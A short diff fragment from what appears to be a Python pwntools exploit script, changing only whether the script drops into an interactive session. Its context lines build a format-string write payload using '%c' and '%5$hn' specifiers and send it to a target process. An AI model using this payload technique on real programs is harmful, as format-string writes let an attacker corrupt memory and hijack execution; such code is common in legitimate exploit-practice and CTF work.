@@ -18,4 +18,4 @@ shellcode += '%' + str(b) +'c%5$hn'
 r_program.recvrepeat(timeout=1)
 r_program.sendline(shellcode)
 print(repr(r_program.recvrepeat(timeout=1)))
-r_program.interactive()
+#r_program.interactive()
